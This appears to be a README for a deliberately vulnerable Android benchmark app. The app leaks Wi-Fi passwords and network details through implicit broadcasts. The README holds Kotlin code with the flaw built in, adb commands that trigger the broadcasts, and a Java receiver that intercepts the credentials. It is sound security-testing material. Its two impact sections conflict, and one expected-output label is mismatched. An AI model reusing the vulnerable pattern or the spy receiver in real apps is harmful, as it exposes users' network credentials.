# oxo-android-ben55: Implicit Broadcast with Sensitive Network Configuration Data

## Vulnerability Overview

Implicit Broadcast with Sensitive Network Configuration Data occurs when Android applications send broadcast intents containing sensitive **network configuration information** without restricting which applications can receive them. This vulnerability allows any app with a matching BroadcastReceiver to intercept and access **WiFi credentials**, network configurations, and connection details.

## Attack Vector: Network Configuration Data Leakage

**Brief Explanation**: A fitness tracking app that broadcasts **network configuration data** (WiFi passwords, network names, IP addresses, connection details) through implicit intents that can be intercepted by any app with matching receivers, enabling network reconnaissance and credential theft attacks.

**Key Characteristics:**
- Broadcasts **WiFi network credentials** and configuration data
- Exposes network passwords and connection details
- Leaks IP addresses, gateway information, and network topology  
- No permission requirements for malicious receivers to intercept network data

**Vulnerable Code Pattern:**
```kotlin
// VULNERABLE: Broadcasting network configuration without restrictions
val networkIntent = Intent("com.fittracker.NETWORK_SYNC")
networkIntent.putExtra("wifi_ssid", "MyHome_WiFi")  // Network name
networkIntent.putExtra("wifi_password", "mySecretPass123")  // WiFi password
networkIntent.putExtra("ip_address", "192.168.1.100")
networkIntent.putExtra("gateway", "192.168.1.1")
sendBroadcast(networkIntent)  // VULNERABLE - Any app can receive network data!

// Broadcasting network configuration data
networkIntent.putExtra("network_type", "WPA2")
networkIntent.putExtra("dns_servers", "8.8.8.8,8.8.4.4")
sendBroadcast(networkIntent)  // VULNERABLE - No permission required!
```

## Testing

### Step 1: Install and Launch FitTracker Pro
```bash
# Install the vulnerable fitness app
adb install -r /path/to/oxo-android-ben55/src/app/build/outputs/apk/debug/app-debug.apk

# Launch the app
adb shell am start -n co.ostorlab.myapplication/.MainActivity
```

### Step 2: Trigger Vulnerable Network Broadcasts
```bash
# Method 1: Simulate network configuration broadcasts
adb shell am broadcast -a "com.fittracker.NETWORK_SYNC" \
  --es wifi_ssid "MyHome_WiFi" \
  --es wifi_password "mySecretPass123" \
  --es ip_address "192.168.1.100" \
  --es gateway "192.168.1.1"

adb shell am broadcast -a "com.fittracker.NETWORK_UPDATE" \
  --es network_name "GymWiFi_5G" \
  --es network_key "gym2024pass!" \
  --es connection_type "WPA2" \
  --es dns_primary "8.8.8.8" \
  --es dns_secondary "8.8.4.4" \
  --es subnet_mask "255.255.255.0"
# Method 2: Simulate network connection broadcasts  
adb shell am broadcast -a "com.fittracker.WIFI_CONNECTED" \
  --es network_ssid "OfficeWiFi_Corp" \
  --es network_password "corporate2024!" \
  --es security_type "WPA2-Enterprise" \
  --es ip_address "10.0.1.150" \
  --es gateway_ip "10.0.1.1"

# Method 3: Simulate network synchronization broadcasts
adb shell am broadcast -a "com.fittracker.NETWORK_SYNC" \
  --es user_id "user_12345" \
  --es home_network "MyHome_5G" \
  --es work_network "OfficeGuest" \
  --es saved_networks "3"
```

### Step 3: Verify Network Data Interception
```bash
# Check broadcast history for intercepted network data
adb shell dumpsys activity broadcasts | sed -n '/Historical broadcasts summary/,/^$/p' | grep -A 5 "com.fittracker"
```

### Expected Results:
```
Historical broadcasts summary [modern]:
#0: act=com.fittracker.NETWORK_SYNC flg=0x400010 (has extras)
    extras: Bundle[{wifi_ssid=MyHome_WiFi, wifi_password=mySecretPass123, ip_address=192.168.1.100, gateway=192.168.1.1}]

#1: act=com.fittracker.WIFI_CONNECTED flg=0x400010 (has extras) 
    extras: Bundle[{network_ssid=OfficeWiFi_Corp, network_password=corporate2024!, security_type=WPA2-Enterprise, ip_address=10.0.1.150, gateway_ip=10.0.1.1}]

#2: act=com.fittracker.WIFI_CONNECTED flg=0x400010 (has extras)
    extras: Bundle[{home_network=MyHome_5G, work_network=OfficeGuest, saved_networks=3}]
```

## Impact Assessment
- **Confidentiality**: Critical - Exposes WiFi passwords, network credentials, and infrastructure details
- **Integrity**: Low - Data interception doesn't modify original information  
- **Availability**: Low - No direct impact on system availability
- **OWASP Mobile Top 10**: M2 - Insecure Data Storage, M4 - Insecure Communication, M10 - Extraneous Functionality
- **CWE**: CWE-200 (Information Exposure), CWE-522 (Insufficiently Protected Credentials), CWE-926 (Improper Export of Android Application Components)

## Malicious Receiver Example

An attacker app can intercept network credentials with:

```xml
<receiver android:name=".NetworkSpyReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.fittracker.NETWORK_SYNC" />
        <action android:name="com.fittracker.NETWORK_UPDATE" />
        <action android:name="com.fittracker.WIFI_CONNECTED" />
    </intent-filter>
</receiver>
```

```java
public class NetworkSpyReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if ("com.fittracker.NETWORK_SYNC".equals(action)) {
            String wifiSSID = intent.getStringExtra("wifi_ssid");
            String wifiPassword = intent.getStringExtra("wifi_password");
            String ipAddress = intent.getStringExtra("ip_address");
            String gateway = intent.getStringExtra("gateway");
            // Attacker now has WiFi credentials and network topology
        }
        
        if ("com.fittracker.WIFI_CONNECTED".equals(action)) {
            String networkName = intent.getStringExtra("network_ssid");
            String networkKey = intent.getStringExtra("network_password");
            String securityType = intent.getStringExtra("security_type");
            // Attacker now has network connection details
        }
    }
}
```

## Network Reconnaissance Attack

Attackers can use intercepted network data for:

1. **WiFi Password Theft**: Direct access to network credentials
2. **Network Mapping**: IP ranges, gateway addresses, DNS servers
3. **Corporate Espionage**: Access to business network configurations
4. **Lateral Movement**: Using stolen credentials for network infiltration

**Example Attack Flow:**
```bash
# 1. Install malicious app with network broadcast receiver
# 2. Wait for victim to use fitness app
# 3. Intercept network credentials via broadcasts
# 4. Connect to victim's networks using stolen credentials
# 5. Perform network reconnaissance and data exfiltration
```

**Difficulty**: Easy - No special permissions required

## Impact Assessment

- **Confidentiality**: Critical - Exposes network passwords and infrastructure details
- **Integrity**: High - Enables network infiltration and data manipulation  
- **Availability**: Medium - Can disrupt network security and access controls
- **OWASP Mobile Top 10**: M2 - Insecure Data Storage, M4 - Insecure Communication, M10 - Extraneous Functionality
- **CWE**: CWE-200 (Information Exposure), CWE-522 (Insufficiently Protected Credentials), CWE-926 (Improper Export of Android Application Components)
